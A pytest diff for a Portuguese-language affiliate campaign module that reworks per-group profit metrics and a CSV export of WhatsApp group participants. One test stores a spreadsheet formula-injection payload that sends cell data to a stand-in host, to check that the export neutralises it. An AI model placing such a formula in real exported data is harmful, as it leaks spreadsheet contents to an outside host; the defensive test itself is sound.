@@ -126,19 +126,31 @@ def test_pedido_cancelado_nao_conta_mas_a_comissao_soma(db):
     assert linha["comissao_liquida"] == pytest.approx(15.0)
 
 
-def test_lucro_por_pessoa_e_a_metrica_de_destaque(db):
+def test_a_linha_do_grupo_nao_tem_gasto_lucro_nem_lucro_por_pessoa(db):
+    """
+    Os três saíram da linha em 04/09 e a razão é aritmética, não estética.
+
+    Eles dependiam de ratear o gasto da campanha entre os grupos, e não existe
+    informação para essa divisão. Pior: quando ninguém entrava no período, o
+    rateio dividia IGUALMENTE — foi assim que R$1.223,05 virou R$611,52 em dois
+    grupos de tamanhos completamente diferentes, e "lucro por pessoa" de
+    −R$0,65 / −R$0,92, que é justamente a métrica de destaque do módulo.
+
+    A comissão por grupo CONTINUA na linha: essa é real, vem do Sub ID do grupo.
+    """
     user, campanha, grupos, ds = _cenario(db)
-    _venda(db, user.id, grupos[0].sub_id, 200.0, "P1", dataset_id=ds)   # grupo com 100 pessoas
+    _venda(db, user.id, grupos[0].sub_id, 200.0, "P1", dataset_id=ds)
     db.commit()
 
     linha = next(l for l in CampanhaResultadoService(db)
                  .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                  if l["grupo_id"] == grupos[0].id)
-    assert linha["lucro"] == pytest.approx(200.0)
-    assert linha["lucro_por_pessoa"] == pytest.approx(2.0)   # 200 / 100
+    assert linha["comissao_liquida"] == pytest.approx(200.0)
+    for campo in ("gasto_atribuido", "lucro", "lucro_por_pessoa"):
+        assert campo not in linha, f"{campo} voltou para a linha do grupo"
 
 
-def test_gasto_do_anuncio_e_rateado_por_entradas(db):
+def test_gasto_do_anuncio_entra_inteiro_no_total_e_nunca_na_linha(db):
     user, campanha, grupos, ds = _cenario(db, imposto_anuncio=10.0)   # markup 10%
     anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                        name="Anúncio de grupo", status="ACTIVE")
@@ -148,17 +160,17 @@ def test_gasto_do_anuncio_e_rateado_por_entradas(db):
                                 spend=100.0, clicks=10, impressions=100, leads=8))
     db.commit()
 
-    # 3 entradas no grupo 0, 1 no grupo 1 → rateio 75/25
     svc = GrupoEventoService(db)
     svc.registrar(user.id, grupos[0].jid, "join",
                   [f"55119999{i:04d}@c.us" for i in range(3)])
     svc.registrar(user.id, grupos[1].jid, "join", ["5511988887777@c.us"])
 
     r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
-    por_id = {l["grupo_id"]: l for l in r["linhas"]}
-    # gasto com imposto = 100 × 1,10 = 110
-    assert por_id[grupos[0].id]["gasto_atribuido"] == pytest.approx(82.5)   # 75%
-    assert por_id[grupos[1].id]["gasto_atribuido"] == pytest.approx(27.5)   # 25%
+    # O gasto entra INTEIRO, uma vez, no nível da campanha — 100 × 1,10 = 110.
+    # Não é a soma de parcelas por grupo: aquela divisão era inventada.
+    assert r["totais"]["gasto_atribuido"] == pytest.approx(110.0)
+    assert r["totais"]["lucro"] == pytest.approx(-110.0)   # sem comissão
+    assert all("gasto_atribuido" not in l for l in r["linhas"])
 
 
 def test_metricas_do_anuncio_distinguem_sem_pixel_de_zero_lead(db):
@@ -211,13 +223,11 @@ def test_campanha_sem_grupos_nao_quebra(db):
     assert r["linhas"] == [] and r["totais"]["lucro"] == 0.0
 
 
-def test_entradas_antigas_ficam_fora_do_periodo_e_do_rateio(db):
+def test_entradas_antigas_ficam_fora_do_periodo(db):
     """
     Entradas/saídas seguem o filtro de período como todo o resto da tela.
 
-    Sem isso a tela soma entradas históricas ao lado de comissão de 7 dias — e,
-    pior, rateia o gasto do período por entradas de meses atrás: o grupo que
-    encheu em julho leva o gasto de agosto.
+    Sem isso a tela soma entradas históricas ao lado de comissão de 7 dias.
     """
     user, campanha, grupos, ds = _cenario(db, imposto_anuncio=0.0)
     anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
@@ -244,9 +254,9 @@ def test_entradas_antigas_ficam_fora_do_periodo_e_do_rateio(db):
     por_id = {l["grupo_id"]: l for l in r["linhas"]}
     assert por_id[grupos[1].id]["entradas"] == 0, "entrada de 40 dias atrás entrou no período"
     assert por_id[grupos[0].id]["entradas"] == 1
-    # Só o grupo 0 teve entrada no período → leva o gasto inteiro.
-    assert por_id[grupos[0].id]["gasto_atribuido"] == pytest.approx(100.0)
-    assert por_id[grupos[1].id]["gasto_atribuido"] == pytest.approx(0.0)
+    # O gasto do período continua inteiro no total, independente de onde as
+    # pessoas entraram — não há mais rateio para as entradas distorcerem.
+    assert r["totais"]["gasto_atribuido"] == pytest.approx(100.0)
 
 
 def test_resumo_consolidado_soma_campanhas_e_preserva_leads_nulo(db):
@@ -416,6 +426,31 @@ def _csv_da_exportacao(resposta) -> list[str]:
     return asyncio.run(_juntar()).strip().splitlines()
 
 
+def _participante(db, grupo, identificador, telefone=None, visto_em=None):
+    """
+    Semeia a lista de membros que o sync manteria.
+
+    A exportação passou a ler `grupo_participantes` (080) em vez de eventos de
+    entrada: um grupo com 946 pessoas acumuladas em meses exportava 8 linhas
+    pelo modelo antigo, porque só quem entrou nos últimos 30 dias tinha evento.
+    """
+    from app.models.whatsapp_grupos import GrupoParticipante
+    from app.services.grupo_evento_service import identificador as _hash
+
+    p = GrupoParticipante(
+        grupo_id=grupo.id,
+        identificador=identificador,
+        telefone=telefone,
+        identificador_hash=_hash(identificador),
+    )
+    if visto_em is not None:
+        p.visto_em = visto_em
+        p.confirmado_em = visto_em
+    db.add(p)
+    db.flush()
+    return p
+
+
 def test_export_neutraliza_formula_no_nome_do_grupo(db):
     """
     O nome do grupo é escrito por QUALQUER admin do grupo — inclusive alguém
@@ -427,12 +462,10 @@ def test_export_neutraliza_formula_no_nome_do_grupo(db):
     user, campanha, grupos, ds = _cenario(db)
     grupos[0].nome = '=HYPERLINK("http://malicioso/?d="&A1;"Clique")'
     db.add(grupos[0])
-    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
-                                     ["5511900000009@c.us"])
+    _participante(db, grupos[0], "5511900000009@c.us", "5511900000009")
     db.commit()
 
     linhas = _csv_da_exportacao(exportar_leads(
-        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
         campanha=campanha, current_user=user, db=db))
     alvo = next(l for l in linhas[1:] if "HYPERLINK" in l)
     assert "'=HYPERLINK" in alvo, "fórmula saiu ativa no CSV"
@@ -446,42 +479,78 @@ def test_export_nao_quebra_com_emoji_no_nome_da_campanha(db):
     user, campanha, grupos, ds = _cenario(db)
     campanha.nome = "Promoção VIP 🔥 verão"
     db.add(campanha)
-    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
-                                     ["5511900000010@c.us"])
+    _participante(db, grupos[0], "5511900000010@c.us", "5511900000010")
     db.commit()
 
-    r = exportar_leads(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
-                       campanha=campanha, current_user=user, db=db)
+    r = exportar_leads(campanha=campanha, current_user=user, db=db)
     r.headers["content-disposition"].encode("latin-1")   # é o que o Starlette faz
 
 
-def test_export_traz_telefone_mas_nunca_o_hash(db):
+def test_export_traz_os_participantes_atuais_e_nunca_o_hash(db):
     """
-    Mudou em 03/09 (spec §3.7): o CSV passa a trazer o número.
+    Mudou de conceito em 04/09: o CSV é a lista de quem está no grupo AGORA.
 
-    Exportar hash é inútil — era o motivo de a exportação de leads não servir
-    para nada. O hash continua no banco (casa entrada com saída), mas NUNCA
-    sai no arquivo: quem lê a planilha não tem o que fazer com ele.
+    Antes exportava EVENTOS de entrada dos últimos 30 dias, e por isso um grupo
+    com centenas de pessoas acumuladas devolvia um punhado de linhas. O hash
+    continua no banco (casa entrada com saída) mas NUNCA sai no arquivo: quem
+    lê a planilha não tem o que fazer com ele.
     """
     from app.api.v1.routes.campanhas_grupos import exportar_leads
 
     user, campanha, grupos, ds = _cenario(db)
-    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
-                                     ["5511977776666@c.us"])
+    p = _participante(db, grupos[0], "5511977776666@c.us", "5511977776666")
     db.commit()
 
     linhas = _csv_da_exportacao(exportar_leads(
-        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
         campanha=campanha, current_user=user, db=db))
     corpo = "\n".join(linhas)
-    assert linhas[0] == "data_entrada,grupo,telefone,origem,ainda_no_grupo"
+    assert linhas[0] == "telefone,grupo,data_entrada"
     # Só os dígitos: o sufixo do JID não é dado para a afiliada.
     assert "5511977776666" in corpo
     assert "@c.us" not in corpo
+    assert p.identificador_hash not in corpo
 
-    evento = db.query(GrupoEvento).filter(
-        GrupoEvento.grupo_id == grupos[0].id).order_by(GrupoEvento.id.desc()).first()
-    assert evento.identificador_hash not in corpo
+
+def test_export_traz_quem_entrou_ha_meses_sem_filtro_de_periodo(db):
+    """
+    O defeito que motivou a mudança: um grupo de 946 pessoas exportava 8 linhas.
+
+    A lista de participantes é um RETRATO, não uma janela — quem está no grupo
+    entra no arquivo mesmo tendo entrado antes de o módulo existir.
+    """
+    from app.api.v1.routes.campanhas_grupos import exportar_leads
+
+    user, campanha, grupos, ds = _cenario(db)
+    antigo = datetime.now(timezone.utc) - timedelta(days=200)
+    _participante(db, grupos[0], "5511900000200@c.us", "5511900000200",
+                  visto_em=antigo)
+    db.commit()
+
+    corpo = "\n".join(_csv_da_exportacao(exportar_leads(
+        campanha=campanha, current_user=user, db=db)))
+    assert "5511900000200" in corpo
+
+
+def test_export_usa_a_data_do_evento_quando_ela_existe(db):
+    """
+    `data_entrada` vem do evento de entrada; na falta dele, sai vazia para quem
+    já estava no grupo desde o primeiro sync — inventar uma data seria pior.
+    """
+    from app.api.v1.routes.campanhas_grupos import exportar_leads
+
+    user, campanha, grupos, ds = _cenario(db)
+    numero = "5511933334444@c.us"
+    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join", [numero])
+    _participante(db, grupos[0], numero, "5511933334444")
+    # Segunda pessoa: veio no MESMO primeiro sync e nunca teve evento.
+    _participante(db, grupos[0], "5511955556666@c.us", "5511955556666")
+    db.commit()
+
+    linhas = _csv_da_exportacao(exportar_leads(
+        campanha=campanha, current_user=user, db=db))
+    por_telefone = {l.split(",")[0]: l.split(",")[2] for l in linhas[1:]}
+    assert por_telefone["5511933334444"], "quem tem evento precisa de data"
+    assert por_telefone["5511955556666"] == "", "data inventada para quem não tem evento"
 
 
 def test_export_deixa_telefone_vazio_quando_o_whatsapp_manda_lid(db):
@@ -494,16 +563,14 @@ def test_export_deixa_telefone_vazio_quando_o_whatsapp_manda_lid(db):
     from app.api.v1.routes.campanhas_grupos import exportar_leads
 
     user, campanha, grupos, ds = _cenario(db)
-    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
-                                     ["84729130@lid"])
+    _participante(db, grupos[0], "84729130@lid", telefone=None)
     db.commit()
 
     linhas = _csv_da_exportacao(exportar_leads(
-        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
         campanha=campanha, current_user=user, db=db))
     assert "84729130" not in "\n".join(linhas)
-    # data, grupo, telefone(vazio), origem, ainda_no_grupo
-    assert linhas[1].split(",")[2] == ""
+    # telefone(vazio), grupo, data_entrada
+    assert linhas[1].split(",")[0] == ""
 
 
 def test_export_filtra_pelos_grupos_selecionados(db):
@@ -511,53 +578,41 @@ def test_export_filtra_pelos_grupos_selecionados(db):
     from app.api.v1.routes.campanhas_grupos import exportar_leads
 
     user, campanha, grupos, ds = _cenario(db)
-    svc = GrupoEventoService(db)
-    svc.registrar(user.id, grupos[0].jid, "join", ["5511900000001@c.us"])
-    svc.registrar(user.id, grupos[1].jid, "join", ["5511900000002@c.us"])
+    _participante(db, grupos[0], "5511900000001@c.us", "5511900000001")
+    _participante(db, grupos[1], "5511900000002@c.us", "5511900000002")
     db.commit()
 
     corpo = "\n".join(_csv_da_exportacao(exportar_leads(
-        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
         grupos=str(grupos[0].id), campanha=campanha, current_user=user, db=db)))
     assert "5511900000001" in corpo
     assert "5511900000002" not in corpo
 
     # Id de grupo que não é da campanha vira 422, não CSV vazio em silêncio.
     with pytest.raises(HTTPException) as erro:
-        exportar_leads(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
-                       grupos="999999", campanha=campanha, current_user=user, db=db)
+        exportar_leads(grupos="999999", campanha=campanha, current_user=user, db=db)
     assert erro.value.status_code == 422
 
 
-def test_quem_saiu_e_voltou_tem_uma_linha_nao_e_outra_sim(db):
+def test_export_nao_traz_quem_saiu_do_grupo(db):
     """
-    "Ainda no grupo" é por ENTRADA, não por pessoa. Resolver pelo estado final
-    marcava as DUAS entradas como "sim" e inflava a permanência justamente da
-    coorte que a exportação existe para medir.
+    A tabela de participantes responde "quem está AGORA" — o sync apaga quem
+    sumiu. Quem saiu continua em `grupo_eventos` (é o que sustenta a evasão),
+    mas não é lead para chamar.
     """
     from app.api.v1.routes.campanhas_grupos import exportar_leads
 
     user, campanha, grupos, ds = _cenario(db)
-    svc = GrupoEventoService(db)
     numero = "5511911112222@c.us"
+    svc = GrupoEventoService(db)
     svc.registrar(user.id, grupos[0].jid, "join", [numero])
     svc.registrar(user.id, grupos[0].jid, "leave", [numero])
-    svc.registrar(user.id, grupos[0].jid, "join", [numero])
-    db.commit()
-    # Ordena os 3 eventos no tempo (o registro é instantâneo demais).
-    db.execute(text("""
-        UPDATE grupo_eventos SET criado_em = now() - (interval '1 minute' * sub.n)
-          FROM (SELECT id, row_number() OVER (ORDER BY id DESC) AS n
-                  FROM grupo_eventos WHERE grupo_id = :gid) sub
-         WHERE grupo_eventos.id = sub.id
-    """), {"gid": grupos[0].id})
+    _participante(db, grupos[0], "5511900000077@c.us", "5511900000077")
     db.commit()
 
-    linhas = _csv_da_exportacao(exportar_leads(
-        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
-        campanha=campanha, current_user=user, db=db))
-    marcas = [l.split(",")[-1] for l in linhas[1:]]
-    assert marcas == ["nao", "sim"], f"esperava uma saída registrada, veio {marcas}"
+    corpo = "\n".join(_csv_da_exportacao(exportar_leads(
+        campanha=campanha, current_user=user, db=db)))
+    assert "5511911112222" not in corpo, "quem saiu do grupo entrou no CSV"
+    assert "5511900000077" in corpo
 
 
 def test_export_de_anuncios_respeita_o_filtro_de_vinculo(db):
@@ -653,12 +708,78 @@ def test_lucro_por_pessoa_sem_participante_e_none_nao_zero(db):
     db.commit()
 
     r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
-    assert all(l["lucro_por_pessoa"] is None for l in r["linhas"])
     assert r["totais"]["lucro_por_pessoa"] is None
-    # E com participante, volta a existir.
+    # E com participante, volta a existir — no TOTAL, que é o único nível onde
+    # lucro existe desde que o rateio por grupo saiu.
     grupos[0].participantes = 50
     db.add(grupos[0]); _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
     db.commit()
     r2 = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
-    linha = next(l for l in r2["linhas"] if l["grupo_id"] == grupos[0].id)
-    assert linha["lucro_por_pessoa"] == pytest.approx(2.0)
+    assert r2["totais"]["lucro_por_pessoa"] == pytest.approx(2.0)   # 100 / 50
+
+
+def test_sub_id_vinculado_a_mao_soma_no_total_e_nao_vira_linha(db):
+    """
+    Sub ID vinculado à campanha (080) é comissão que não passa por grupo
+    rastreado — entra no TOTAL. Nunca numa linha de grupo: não há como saber a
+    qual grupo pertence, e inventar seria o mesmo erro do rateio que saiu daqui.
+    """
+    from app.models.campanha_grupos import CampanhaSubId
+
+    user, campanha, grupos, ds = _cenario(db)
+    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
+    _venda(db, user.id, "promoavulsa", 50.0, "P2", dataset_id=ds)
+    db.add(CampanhaSubId(campanha_id=campanha.id, sub_id="promoavulsa"))
+    db.commit()
+
+    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
+    assert r["totais"]["comissao_liquida"] == pytest.approx(150.0)
+    assert r["totais"]["pedidos"] == 2
+    # A linha do grupo continua só com o que é dela.
+    linha = next(l for l in r["linhas"] if l["grupo_id"] == grupos[0].id)
+    assert linha["comissao_liquida"] == pytest.approx(100.0)
+    assert all(l["grupo"] is not None for l in r["linhas"])
+    assert len(r["linhas"]) == 2, "o sub_id manual virou linha de grupo"
+
+
+def test_sub_id_de_grupo_vinculado_a_mao_nao_conta_duas_vezes(db):
+    """
+    A dedup é o ponto inteiro: o mesmo sub_id vinculado à mão E pertencente a um
+    grupo da campanha somaria a comissão nas duas pontas.
+
+    O service já bloqueia esse vínculo, mas a linha pode existir de uma versão
+    anterior ou de um grupo adicionado DEPOIS do vínculo — e aí é o cálculo que
+    precisa segurar.
+    """
+    from app.models.campanha_grupos import CampanhaSubId
+
+    user, campanha, grupos, ds = _cenario(db)
+    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
+    db.add(CampanhaSubId(campanha_id=campanha.id, sub_id=grupos[0].sub_id))
+    db.commit()
+
+    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
+    assert r["totais"]["comissao_liquida"] == pytest.approx(100.0), "comissão dobrada"
+    assert r["totais"]["pedidos"] == 1
+
+
+def test_roas_do_total_e_none_sem_investimento_nao_zero(db):
+    """0.00x afirmaria que cada real gasto voltou zero — sem gasto, o ROAS não
+    existe. Mesmo colapso null-vs-zero que o módulo evita em `leads` e `cpl`."""
+    user, campanha, grupos, ds = _cenario(db)
+    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
+    db.commit()
+
+    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
+    assert r["totais"]["roas"] is None
+
+    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
+                       name="A", status="ACTIVE")
+    db.add(anuncio); db.flush()
+    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
+    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
+                                spend=50.0, clicks=5, impressions=50, leads=None))
+    db.commit()
+
+    r2 = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
+    assert r2["totais"]["roas"] == pytest.approx(2.0)   # 100 / 50
